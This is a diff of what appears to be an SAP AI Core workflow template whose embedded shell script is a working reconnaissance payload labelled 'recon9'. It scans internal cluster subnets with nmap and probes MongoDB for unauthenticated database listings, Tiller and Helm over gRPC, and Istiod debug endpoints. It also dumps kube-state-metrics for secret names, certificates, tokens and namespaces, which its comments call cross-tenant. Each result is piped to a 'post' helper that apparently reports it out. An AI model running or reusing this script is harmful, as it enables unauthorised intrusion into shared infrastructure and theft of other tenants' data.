@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "9.0.0"
+    ai.sap.com/version: "9.0.1"
 spec:
   entrypoint: main
   templates:
@@ -31,7 +31,6 @@ spec:
         get "recon9-start-$(hostname)"
 
         # === 1. TARGETED SCAN: Find MongoDB and Tiller IPs ===
-        # Scan ONLY ports 27017,44134,15014 on 100.104.0.0/24 (fast)
         nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,15014 100.104.0.0/24 -oG /tmp/targeted.txt 2>&1 | tail -3 | post "recon9-targeted-summary"
         grep "Ports:" /tmp/targeted.txt | post "recon9-targeted-hosts"
 
@@ -40,36 +39,10 @@ spec:
         echo "mongo_ip=${MONGO_IP}" | post "recon9-mongo-ip"
 
         if [ -n "$MONGO_IP" ]; then
-          # Try connecting without auth and list databases
-          # netshoot has mongosh? If not, use ncat raw
-          which mongosh 2>&1 | post "recon9-mongosh-check"
-
-          # Raw MongoDB wire protocol - send isMaster command via ncat
-          # Or try HTTP interface (port 28017 sometimes)
           curl -s --connect-timeout 3 "http://${MONGO_IP}:28017/" 2>&1 | head -c 700 | post "recon9-mongo-http"
-
-          # Try mongosh if available
           timeout 10 mongosh --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-listdb"
-
-          # If mongosh not available, try with mongo legacy
-          timeout 10 mongo --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-legacy-listdb"
-
-          # Try ncat to check if auth is required
-          echo '{"isMaster": 1}' | timeout 5 ncat ${MONGO_IP} 27017 2>&1 | head -c 700 | post "recon9-mongo-ncat"
-
-          # Try python if available
-          python3 -c "
-import socket,struct
-s=socket.socket()
-s.settimeout(5)
-s.connect(('${MONGO_IP}',27017))
-# OP_QUERY for isMaster
-msg=b'\\x3f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\x07\\x00\\x00\\x00\\x00\\x00\\x00admin.\\x24cmd\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x10isMaster\\x00\\x01\\x00\\x00\\x00\\x00'
-hdr=struct.pack('<i',len(msg)+4)+msg
-s.send(hdr)
-r=s.recv(4096)
-print(r[:500])
-" 2>&1 | head -c 700 | post "recon9-mongo-python"
+          timeout 10 mongo --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-legacy"
+          echo "" | timeout 5 ncat ${MONGO_IP} 27017 2>&1 | xxd | head -c 700 | post "recon9-mongo-banner"
         fi
 
         # === 3. TILLER PROBE (port 44134) ===
@@ -77,21 +50,11 @@ print(r[:500])
         echo "tiller_ip=${TILLER_IP}" | post "recon9-tiller-ip"
 
         if [ -n "$TILLER_IP" ]; then
-          # Tiller uses gRPC - try HTTP/2 health
           curl -s --connect-timeout 3 "http://${TILLER_IP}:44134/" 2>&1 | head -c 700 | post "recon9-tiller-http"
-
-          # Try gRPC reflection
-          # grpcurl if available
           which grpcurl 2>&1 | post "recon9-grpcurl-check"
-          grpcurl -plaintext ${TILLER_IP}:44134 list 2>&1 | head -c 700 | post "recon9-tiller-grpc-list"
-
-          # Raw connection check
-          echo "" | timeout 3 ncat ${TILLER_IP} 44134 2>&1 | head -c 700 | post "recon9-tiller-ncat"
-
-          # Try Helm if available
+          grpcurl -plaintext ${TILLER_IP}:44134 list 2>&1 | head -c 700 | post "recon9-tiller-grpc"
+          echo "" | timeout 3 ncat ${TILLER_IP} 44134 2>&1 | xxd | head -c 700 | post "recon9-tiller-banner"
           which helm 2>&1 | post "recon9-helm-check"
-          HELM_HOST=${TILLER_IP}:44134 helm ls 2>&1 | head -c 700 | post "recon9-helm-ls"
-          HELM_HOST=${TILLER_IP}:44134 helm version 2>&1 | head -c 700 | post "recon9-helm-version"
         fi
 
         # === 4. ISTIOD PROBE (port 15014) ===
@@ -99,52 +62,42 @@ print(r[:500])
         echo "istiod_ip=${ISTIOD_IP}" | post "recon9-istiod-ip"
 
         if [ -n "$ISTIOD_IP" ]; then
-          # Istiod debug endpoints
           curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/configz" 2>&1 | head -c 1800 | post "recon9-istiod-configz"
           curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/endpointz" 2>&1 | head -c 1800 | post "recon9-istiod-endpointz"
           curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/registryz" 2>&1 | head -c 1800 | post "recon9-istiod-registryz"
           curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/syncz" 2>&1 | head -c 1800 | post "recon9-istiod-syncz"
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/metrics" 2>&1 | head -c 1800 | post "recon9-istiod-metrics"
           curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/authorizationz" 2>&1 | head -c 1800 | post "recon9-istiod-authz"
-          # Try port 15010 (gRPC) and 15012 (secure gRPC) too
           curl -s --connect-timeout 3 "http://${ISTIOD_IP}:8080/debug/configz" 2>&1 | head -c 700 | post "recon9-istiod-8080"
         fi
 
-        # === 5. QUICK SCANS of other interesting ranges (just the 3 hot ports + extras) ===
-        # Scan 100.104.1-10 for mongo/tiller only
+        # === 5. EXTENDED PORT SCAN (just hot ports, wider ranges) ===
         for i in 1 2 3 4 5 7 8 9 10 50 100 150 178 200; do
           nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,2379,3100,5432,6379,9200 100.104.${i}.0/24 -oG - 2>/dev/null | grep "Ports:" >> /tmp/extended.txt
         done
         wc -l /tmp/extended.txt 2>/dev/null | post "recon9-extended-count"
         cat /tmp/extended.txt 2>/dev/null | head -c 1800 | post "recon9-extended-open"
 
-        # === 6. Pod subnet scan ===
+        # === 6. POD SUBNET ===
         MY_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
         MY_NET=$(echo $MY_IP | sed 's/\.[0-9]*$/.0/')
         echo "pod_ip=${MY_IP}" | post "recon9-pod-ip"
         nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,2379,3100,8080,9200 ${MY_NET}/24 -oG - 2>/dev/null | grep "Ports:" | head -c 1800 | post "recon9-pod-subnet"
 
-        # === 7. KSM full dump (top priority from recon7) ===
-        # Get pod metrics (cross-tenant!)
-        curl -s --connect-timeout 5 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 > /tmp/ksm_pods.txt
+        # === 7. KSM FULL DUMP ===
+        curl -s --connect-timeout 10 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_pods.txt 2>&1
         wc -c /tmp/ksm_pods.txt | post "recon9-ksm-pods-size"
-        # Extract namespace and pod names
-        grep "kube_pod_info" /tmp/ksm_pods.txt | head -c 1800 | post "recon9-ksm-pod-info-1"
-        grep "kube_pod_info" /tmp/ksm_pods.txt | sed -n '10,30p' | head -c 1800 | post "recon9-ksm-pod-info-2"
-        # Extract secret names
+        grep "kube_pod_info" /tmp/ksm_pods.txt | head -20 | head -c 1800 | post "recon9-ksm-pod-info-1"
+        grep "kube_pod_info" /tmp/ksm_pods.txt | sed -n '20,40p' | head -c 1800 | post "recon9-ksm-pod-info-2"
         grep "kube_secret" /tmp/ksm_pods.txt | head -c 1800 | post "recon9-ksm-secrets"
-        # Extract all unique namespaces
         grep -oE 'namespace="[^"]*"' /tmp/ksm_pods.txt | sort -u | head -c 1800 | post "recon9-ksm-namespaces"
 
-        # Custom KSM (cert data)
-        curl -s --connect-timeout 5 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 > /tmp/ksm_custom.txt
+        curl -s --connect-timeout 10 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_custom.txt 2>&1
         wc -c /tmp/ksm_custom.txt | post "recon9-ksm-custom-size"
         grep -i "secret\|cert\|key\|credential\|token" /tmp/ksm_custom.txt | head -c 1800 | post "recon9-ksm-custom-secrets"
 
-        # Multi KSM (cronjobs, deployments)
-        curl -s --connect-timeout 5 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 > /tmp/ksm_multi.txt
+        curl -s --connect-timeout 10 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_multi.txt 2>&1
         wc -c /tmp/ksm_multi.txt | post "recon9-ksm-multi-size"
-        grep "kube_secret_info\|kube_configmap_info\|kube_deployment_labels" /tmp/ksm_multi.txt | head -c 1800 | post "recon9-ksm-multi-resources"
+        grep "kube_secret_info\|kube_configmap_info" /tmp/ksm_multi.txt | head -c 1800 | post "recon9-ksm-multi-secrets"
         grep -oE 'namespace="[^"]*"' /tmp/ksm_multi.txt | sort -u | head -c 700 | post "recon9-ksm-multi-ns"
 
         get "recon9-done-$(hostname)"
